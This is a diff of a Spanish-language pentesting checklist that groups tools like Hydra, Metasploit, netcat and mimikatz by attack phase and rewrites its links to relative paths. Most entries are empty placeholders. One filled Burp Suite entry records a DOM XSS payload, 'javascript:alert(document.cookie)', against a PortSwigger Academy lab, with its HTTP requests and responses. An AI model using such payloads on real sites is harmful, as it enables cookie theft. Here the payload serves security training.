+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap)
+*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -789,7 +782,7 @@
     ```
 
     * CONCLUSION:
-*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap)
+*   [ ] BETTERCAP👈 --------------------------------->[https://www.kali.org/tools/bettercap/ ](https://www.kali.org/tools/bettercap/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/bettercap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -875,13 +868,11 @@
 
 🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪
 
-
-
 <details>
 
 <summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
-### INVESTIGACION OSINT
+#### INVESTIGACION OSINT
 
 *   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)
 
@@ -932,28 +923,28 @@
     ```
 
     * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
+*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
+*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
+*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan)
+*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -1074,13 +1065,11 @@
 
 🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩
 
-
-
 <details>
 
 <summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
-### HASHES Y DESENCRIPTADOS
+#### HASHES Y DESENCRIPTADOS
 
 *   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)
 
@@ -1301,13 +1290,11 @@
 
 🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
 
-
-
 <details>
 
 <summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
-### FUERZA BRUTA A LOGINS
+#### FUERZA BRUTA A LOGINS
 
 *   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)
 
@@ -1372,21 +1359,21 @@
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -1465,22 +1452,20 @@
 
 🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧
 
-
-
 <details>
 
 <summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
-### SCRIPT DE EXPLOIT Y PAYLOADS
+#### SCRIPT DE EXPLOIT Y PAYLOADS
 
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -1591,15 +1576,13 @@
 
 🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
 
-
-
 <details>
 
 <summary>🤯 EXPLOTACION ✔️</summary>
 
-### EXPLOTACION
+#### EXPLOTACION
 
-*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     REQUEST NORMAL:
@@ -1623,18 +1606,18 @@
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
     Connection: close
-    
-    
+
+
     RESPONSE NORMAL:
-    
-    
-    
-    
+
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 4187
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1714,22 +1697,22 @@
             </div>
         </body>
     </html>
-    
-    
-    
-    
+
+
+
+
     ---------
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
     REQUEST CON EL PAYLOAD:
-    
-    
-    
-    
+
+
+
+
     GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/2
     Host: 0a5b005403084840842406c7000c009f.web-security-academy.net
     Cookie: session=ikLJY5rvgZijWf3eFcy7eLPtLB3dh5Ql
@@ -1747,25 +1730,25 @@
     Referer: https://0a5b005403084840842406c7000c009f.web-security-academy.net/
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
     RESPONSE:
-    
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 4187
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1847,95 +1830,93 @@
     </html>
 
     ```
-    
+
     * CONCLUSION: LUEGO DE EJECUTAR NUESTRO PAYLOAD DENTROM D EL PARAMETRO "returnPath=javascript:alert(document.cookie) " LA RESPONSE DEL LADO DEL SERVIDOR NO SE VEE AFECTADA CON EL PÂRAMETRO DEL PATH QUE CARGAMOS NOSOSTROS CON NUESTRO PAYLOAD POR QUE DIRECTAMENTE SE ESTA EJECUTANDO NUESTRO "XSS" EN EL "DOM" DEL SITIO AL MOMENTO DE CARGARSE EN EL BROWSER Y LOGRANDO ASI EJECUTARSE EL PAYLOAD ALERT EFECTIVAMENTE AL HACERLE CLICK.
-
-
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
+*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
+*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
+*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2028,78 +2009,76 @@
 
 ⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔
 
-
-
 <details>
 
 <summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
-### ESCALADA DE PRIVILEGIOS WINDOWS
+#### ESCALADA DE PRIVILEGIOS WINDOWS
 
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
+
+    ```python
+    # Espacio para fragmento de código Python -->
+    ```
+
+    * CONCLUSION:
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2113,14 +2092,14 @@
     ```
 
     * CONCLUSION:
-*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux)
+*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] MIMIKATZ👈 --------------------------------->[https://www.kali.org/tools/mimikatz/ ](https://www.kali.org/tools/mimikatz/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/mimikatz-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows)
+*   [ ] MIMIKATZ👈 --------------------------------->[https://www.kali.org/tools/mimikatz/ ](https://www.kali.org/tools/mimikatz/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/mimikatz-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2290,85 +2269,83 @@
 
